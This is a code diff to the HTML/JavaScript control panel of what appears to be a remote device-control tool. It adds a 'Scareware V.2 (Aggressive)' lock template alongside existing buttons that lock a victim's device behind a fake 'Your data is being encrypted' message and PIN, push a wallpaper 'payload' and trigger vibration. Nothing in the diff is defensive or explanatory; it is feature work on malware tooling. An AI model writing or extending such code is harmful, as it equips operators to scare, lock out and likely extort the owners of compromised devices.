@@ -276,8 +276,18 @@
                 f.innerHTML = `<button class="action-btn" onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY PAYLOAD</button>`;
                 return;
             } else if(t === 'toast') {
-                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">`;
-                f.innerHTML = `<button class="action-btn red" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
+                b.innerHTML = `
+                    <p style="color:var(--dim); margin-bottom:5px;">Lock Template:</p>
+                    <select id="ltemplate" style="background:#0a0a0a; border:1px solid #333; padding:10px; color:var(--primary); width:100%; margin-bottom:15px; outline:none;">
+                        <option value="1">Legacy v.1 (Classic)</option>
+                        <option value="2">Scareware V.2 (Aggressive)</option>
+                    </select>
+                    <p style="color:var(--dim); margin-bottom:5px;">System Message:</p>
+                    <textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\nYour data is being encrypted.</textarea>
+                    <p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p>
+                    <input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">
+                `;
+                f.innerHTML = `<button class="action-btn red" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value+'|'+document.getElementById('ltemplate').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
                 return;
             } else if(t === 'vibrate') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
